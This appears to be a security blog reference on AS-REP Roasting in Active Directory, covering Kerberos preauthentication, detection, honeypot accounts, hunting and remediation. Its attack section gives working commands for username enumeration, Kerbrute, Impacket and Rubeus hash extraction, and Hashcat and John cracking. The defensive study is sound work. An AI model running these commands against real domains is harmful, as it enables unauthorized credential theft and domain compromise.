---
title: "AS-REP Roasting"
description: "Complete AS-REP Roasting reference: Kerberos preauthentication internals, unauthenticated attack execution, honeypot accounts, detection logic, and prevention, with every step explained."
date: 2026-06-12T09:15:00
category: Active-Directory
tags:
  - Active Directory
  - Kerberos
  - Credential Access
  - Threat Hunting
author: "Luca Manfrin"
published: true
archived: false
pinned: false
featured: false
---

## Definition

AS-REP Roasting targets Active Directory accounts configured with the flag **"Do not require Kerberos preauthentication"** (`DONT_REQ_PREAUTH`, UAC flag `0x400000`). When set, the Kerberos Key Distribution Center (KDC) responds to authentication requests without first verifying that the requester actually knows the account's password. The response contains data encrypted with the account's credential hash, extractable and crackable offline.

Unlike Kerberoasting, AS-REP Roasting can be performed **entirely unauthenticated**: you do not need a valid domain session. You only need to know or guess a valid username.

---

## Kerberos Preauthentication, What It Is and Why It Matters

### Normal Kerberos AS-REQ flow (preauthentication enabled)

1. Client encrypts a timestamp with its own NT hash (PBKDF2-derived key)
2. Client sends this in the AS-REQ to the KDC
3. KDC decrypts the timestamp with the stored account key, if valid, the user is authenticated
4. KDC returns an AS-REP with a TGT encrypted with the krbtgt key, and a session key encrypted with the user's key

The encrypted timestamp proves the requester knows the password **before** the KDC responds.

### Without preauthentication (`DONT_REQ_PREAUTH`)

1. Client sends an AS-REQ with no encrypted timestamp
2. KDC responds immediately with an AS-REP
3. The AS-REP contains a session key encrypted with the account's hash
4. An attacker who captures this response can attempt to crack the encrypted blob offline

The KDC is not doing anything wrong, it is behaving exactly as designed. The vulnerability is the flag itself.

---

## Why This Flag Exists

The `DONT_REQ_PREAUTH` flag exists for legacy compatibility:
- Some older MIT Kerberos client implementations (Unix/Linux) did not support preauthentication
- Some legacy SAP and Oracle ERP integrations still require it
- Older macOS Kerberos bindings (pre-10.9) needed it

In a modern Windows-only domain, **there is no legitimate reason for this flag to exist on any account**.

---

## How an Attacker Performs This Attack

### Step 1, Username Enumeration (unauthenticated)

AS-REP Roasting can be preceded by username enumeration because the KDC returns different error codes depending on whether a username exists:

- `KDC_ERR_C_PRINCIPAL_UNKNOWN` (0x6) → username does not exist
- `KDC_ERR_PREAUTH_REQUIRED` (0x19) → username exists, preauthentication required
- `KDC_ERR_PREAUTH_FAILED` (0x18) → username exists, wrong credentials
- Valid AS-REP returned → username exists AND `DONT_REQ_PREAUTH` is set

```bash
# Kerbrute, enumerate valid usernames via Kerberos AS-REQ
./kerbrute userenum -d domain.local --dc 192.168.1.10 usernames.txt

# Kerbrute, combined enum + AS-REP roast
./kerbrute bruteuser -d domain.local --dc 192.168.1.10 -o valid_users.txt usernames.txt
```

### Step 2, AS-REP Roasting

```bash
# Impacket, unauthenticated, with a username list
python3 GetNPUsers.py domain.local/ -no-pass -usersfile users.txt \
  -dc-ip 192.168.1.10 -outputfile asrep_hashes.txt

# Impacket, authenticated, auto-enumerate vulnerable accounts
python3 GetNPUsers.py domain.local/lowprivuser:password \
  -dc-ip 192.168.1.10 -request -outputfile asrep_hashes.txt

# With existing TGT (pass-the-ticket context)
export KRB5CCNAME=/tmp/user.ccache
python3 GetNPUsers.py domain.local/ -k -no-pass -dc-ip 192.168.1.10 -request
```

```powershell
# Rubeus, roast all accounts with preauthentication disabled
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Target a specific account
.\Rubeus.exe asreproast /user:targetuser /format:hashcat /outfile:asrep_hashes.txt

# PowerView, enumerate vulnerable accounts first
Get-DomainUser -PreauthNotRequired | Select-Object SamAccountName, DistinguishedName
```

### Step 3, Offline Cracking

The resulting hash (Kerberos 5 AS-REP etype 23, Hashcat mode 18200):

```
$krb5asrep$23$user@DOMAIN.LOCAL:3e156...
```

```bash
# Hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/dive.rule

# John
john --format=krb5asrep asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Security Problems

**1. No authentication required.** An attacker on the network (or with a foothold anywhere in the domain) can roast without owning any domain account.

**2. No lockout, no noise.** The KDC processes these requests normally. There are no failed authentication events, no rate limiting, no lockout counter increments.

**3. Blind cracking phase.** Offline cracking is invisible to the domain entirely. The attacker can take months to crack a complex password, no domain-side detection is possible during that window.

**4. Username enumeration amplifies the attack.** Because the KDC behaves differently for valid vs. invalid usernames, an attacker can build a complete username list from a standard wordlist before ever requesting hashes.

**5. Any account can be vulnerable.** There is no type restriction on `DONT_REQ_PREAUTH`, it can be set on Domain Admins, service accounts, or any user. Finding a Domain Admin with this flag is a direct path to full domain compromise.

**6. AES still crackable, just slower.** If the attacker requests AES AS-REPs (Hashcat mode 19900 for AES256), they are harder but not impossible to crack, especially with weak passwords.

---

## How to Detect It

### Event ID 4768, The Primary Signal

Event 4768 is generated on the DC when an AS-REQ is received. The key field is `PreAuthType`:

| PreAuthType value | Meaning |
|---|---|
| `0` | No preauthentication, AS-REP Roasting |
| `2` | Encrypted timestamp (normal) |
| `138` | PKINIT (certificate-based, normal) |
| `16` | Hardware token (normal) |

```powershell
# Detect AS-REP requests with PreAuthType = 0
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4768 } |
  Where-Object {
    $_.Properties[8].Value -eq '0' -and
    $_.Properties[3].Value -eq '0x0'    # ResultCode = success
  } |
  Select-Object TimeCreated,
    @{ n = 'TargetAccount';  e = { $_.Properties[0].Value } },
    @{ n = 'ClientAddress';  e = { $_.Properties[9].Value } },
    @{ n = 'EncryptionType'; e = { $_.Properties[6].Value } } |
  Sort-Object TimeCreated -Descending
```

```powershell
# Detect username enumeration, bursts of 4768 with ResultCode 0x6 (user not found)
$start = (Get-Date).AddHours(-1)
Get-WinEvent -FilterHashtable @{
  LogName = 'Security'; Id = 4768; StartTime = $start
} | Where-Object { $_.Properties[3].Value -eq '0x6' } |
  Group-Object { $_.Properties[9].Value } |
  Where-Object { $_.Count -gt 10 } |
  Select-Object @{ n = 'SourceIP'; e = { $_.Name } }, Count |
  Sort-Object Count -Descending
```

```powershell
# Combined: enumeration burst (0x6) followed by valid AS-REP (PreAuth=0) from same IP
# This pattern indicates Kerbrute + AS-REP roasting in sequence
$start   = (Get-Date).AddHours(-2)
$fails   = Get-WinEvent -FilterHashtable @{
              LogName = 'Security'; Id = 4768; StartTime = $start
           } | Where-Object { $_.Properties[3].Value -eq '0x6' } |
           Group-Object { $_.Properties[9].Value }

$roasts  = Get-WinEvent -FilterHashtable @{
              LogName = 'Security'; Id = 4768; StartTime = $start
           } | Where-Object { $_.Properties[8].Value -eq '0' } |
           Group-Object { $_.Properties[9].Value }

$suspectIPs = $fails.Name | Where-Object { $roasts.Name -contains $_ }
if ($suspectIPs) {
  Write-Warning "IPs performing enum+roast: $($suspectIPs -join ', ')"
}
```

### Sysmon Detection

```powershell
# Sysmon Event 3, Network connection to port 88 (Kerberos) from non-system processes
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-Sysmon/Operational'; Id = 3
} | Where-Object {
  $_.Properties[6].Value -eq '88' -and
  $_.Properties[4].Value -notmatch 'lsass|system|services'
} | Select-Object TimeCreated,
    @{ n = 'Process';   e = { $_.Properties[4].Value } },
    @{ n = 'DestIP';    e = { $_.Properties[14].Value } },
    @{ n = 'DestPort';  e = { $_.Properties[6].Value } }
```

---

## Honeypot Account Strategy

Deploy a dedicated account with `DONT_REQ_PREAUTH` intentionally set, with a strong password that will never be cracked. Any AS-REP request against this account triggers an alert.

### Setup

```powershell
# Create the honeypot user
New-ADUser `
  -Name              "svc_ldapquery" `
  -SamAccountName    "svc_ldapquery" `
  -UserPrincipalName "svc_ldapquery@domain.local" `
  -Description       "LDAP query service - legacy integration" `
  -AccountPassword   (ConvertTo-SecureString `
                        "Hx!9mK#3vQ@LpW&7nZ^2rT*8dF$6bY+4" `
                        -AsPlainText -Force) `
  -Enabled           $true `
  -PasswordNeverExpires $true

# Set DONT_REQ_PREAUTH on the honeypot account
Set-ADAccountControl -Identity "svc_ldapquery" -DoesNotRequirePreAuth $true

# Verify
Get-ADUser svc_ldapquery -Properties DoesNotRequirePreAuth |
  Select-Object SamAccountName, DoesNotRequirePreAuth
```

### Why this is powerful

- Zero legitimate processes ever request an AS-REP for this account
- Any 4768 event where `TargetAccount = svc_ldapquery` AND `PreAuthType = 0` is a guaranteed alert
- Even unauthenticated Kerbrute scans will trigger it if the username is guessable
- You can make the account name partially guessable (`svc_`, `admin_`, `backup_`) to increase the chance of being hit during username brute-forcing

### Alert Logic

```powershell
# Query on DC: any AS-REP for the honeypot account = immediate alert
$honeyUser = "svc_ldapquery"

Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4768 } |
  Where-Object {
    $_.Properties[0].Value -eq $honeyUser -and
    $_.Properties[8].Value -eq '0'
  } |
  ForEach-Object {
    Write-Warning "HONEYPOT HIT: AS-REP Roast attempt against $honeyUser from $($_.Properties[9].Value)"
  }
```

> [!WARNING]
> Document the honeypot account in your CMDB/asset inventory and restrict visibility to the security team. If other IT staff see it and try to "fix" the `DONT_REQ_PREAUTH` flag, you lose the trap. Use a deny ACL to prevent non-admin modification.

---

## How to Hunt It (Post-Incident)

### Phase 1, Identify all vulnerable accounts

```powershell
# Full audit of DONT_REQ_PREAUTH accounts
Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } `
  -Properties DoesNotRequirePreAuth, PasswordLastSet, PasswordNeverExpires,
              Enabled, MemberOf, AdminCount, Description |
  Select-Object SamAccountName, Enabled, PasswordLastSet, PasswordNeverExpires,
    AdminCount, Description,
    @{ n = 'PasswordAgeDays'; e = {
        if ($_.PasswordLastSet) {
          [int](((Get-Date) - $_.PasswordLastSet).TotalDays)
        } else { 99999 }
      }
    },
    @{ n = 'Groups'; e = {
        ($_.MemberOf | ForEach-Object { (Get-ADGroup $_).Name }) -join ', '
      }
    } |
  Sort-Object PasswordAgeDays -Descending

# LDAP filter alternative
Get-ADUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" `
  -Properties PasswordLastSet, Enabled, AdminCount
```

### Phase 2, Historical 4768 review

```powershell
$start = (Get-Date).AddDays(-30)
$dcs   = (Get-ADDomainController -Filter *).HostName

foreach ($dc in $dcs) {
  Get-WinEvent -ComputerName $dc -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4768
    StartTime = $start
  } -ErrorAction SilentlyContinue |
    Where-Object { $_.Properties[8].Value -eq '0' } |
    Select-Object TimeCreated,
      @{ n = 'DC';      e = { $dc } },
      @{ n = 'Account'; e = { $_.Properties[0].Value } },
      @{ n = 'IP';      e = { $_.Properties[9].Value } }
}
```

### Phase 3, Correlate with subsequent account activity

```powershell
# If a roasted account was later compromised, look for logon anomalies
$roastedAccounts = @("svc_ldap", "user_npa")  # fill from Phase 2 results

foreach ($acct in $roastedAccounts) {
  Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624 } |
    Where-Object { $_.Properties[5].Value -eq $acct } |
    Select-Object TimeCreated,
      @{ n = 'LogonType'; e = { $_.Properties[8].Value } },
      @{ n = 'Source';    e = { $_.Properties[18].Value } }
}
```

---

## How to Prevent It

### 1. Enable preauthentication on all accounts, the definitive fix

```powershell
# Remediate all accounts in one pass
Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } |
  ForEach-Object {
    Set-ADAccountControl $_ -DoesNotRequirePreAuth $false
    Write-Output "Fixed: $($_.SamAccountName)"
  }

# Verify remediation
(Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true }).Count
# Should return 0 (or 1 if you have a honeypot account)
```

> [!WARNING]
> Before bulk-remediating, check with application owners whether any system explicitly depends on `DONT_REQ_PREAUTH`. Legacy SAP, Oracle EBS, and some older Java Kerberos clients (MIT Kerberos < 1.7) may require it. Coordinate a test window.

### 2. Enforce AES, make cracking harder

```powershell
# Set AES-only on affected accounts
Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } |
  ForEach-Object {
    Set-ADUser $_ -Replace @{ 'msDS-SupportedEncryptionTypes' = 24 }  # AES128+AES256
  }
```

### 3. Scheduled compliance audit

```powershell
# Weekly check, run via Scheduled Task or Azure Automation
$vulnerable = Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } |
  Where-Object { $_.SamAccountName -ne "svc_ldapquery" }  # exclude honeypot

if ($vulnerable.Count -gt 0) {
  $names = ($vulnerable | Select-Object -ExpandProperty SamAccountName) -join ', '
  Send-MailMessage -To "secops@domain.local" -From "audit@domain.local" `
    -Subject "ALERT: AS-REP vulnerable accounts found" `
    -Body "Accounts with DONT_REQ_PREAUTH: $names" `
    -SmtpServer "smtp.domain.local"
}
```

### 4. Block at the firewall, limit Kerberos port 88 access

Workstations should only query the DC on port 88 via LSASS. Direct access from non-domain-joined hosts to port 88 should be restricted.

```
Firewall rule: DENY external/untrusted networks → DC:88 (Kerberos)
Allow: internal subnets → DC:88 only from domain-joined hosts
```

---

## Conclusion

AS-REP Roasting is uniquely dangerous because it requires no credentials at all, just a username and network access to port 88. The honeypot account is the most effective detection: configure one account with `DONT_REQ_PREAUTH`, strong password, and alert on any 4768 against it. The fix is a single attribute change: `Set-ADAccountControl -DoesNotRequirePreAuth $false`. The only reason to delay is legacy application compatibility, identify those dependencies, fix them, and close the exposure.
